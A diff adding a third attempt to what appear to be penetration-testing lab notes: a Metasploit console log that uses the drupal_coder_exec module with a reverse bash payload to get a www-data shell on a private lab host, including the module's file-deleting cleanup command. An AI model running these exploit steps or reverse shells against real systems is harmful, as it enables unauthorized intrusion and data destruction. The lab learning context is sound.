@@ -369,4 +369,60 @@ msf exploit(unix/ftp/proftpd_modcopy_exec) > sessions -i 3
 
 whoami
 www-data
+
+
+```
+## Attemp 3: drupal
+```
+msf exploit(unix/webapp/drupal_coder_exec) > show options
+
+Module options (exploit/unix/webapp/drupal_coder_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:
+                                         port[,type:host:port][...]. Suppor
+                                         ted proxies: socks4, socks5, socks
+                                         5h, http, sapni
+   RHOSTS                      yes       The target host(s), see https://do
+                                         cs.metasploit.com/docs/using-metas
+                                         ploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing con
+                                         nections
+   TARGETURI  /                yes       The target URI of the Drupal insta
+                                         llation
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_bash):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.15        yes       The listen address (an interface may b
+                                     e specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(unix/webapp/drupal_coder_exec) > set TARGETURI /drupal
+TARGETURI => /drupal
+msf exploit(unix/webapp/drupal_coder_exec) > set RHOSTS 10.0.2.3RHOSTS => 10.0.2.3
+msf exploit(unix/webapp/drupal_coder_exec) > exploit
+[*] Started reverse TCP handler on 10.0.2.15:4444 
+[*] Cleaning up: [ -f coder_upgrade.run.php ] && find . \! -name coder_upgrade.run.php -delete
+[*] Command shell session 1 opened (10.0.2.15:4444 -> 10.0.2.3:37926) at 2025-12-06 13:25:48 +0800
+
+whoami
+www-data
+
 ```
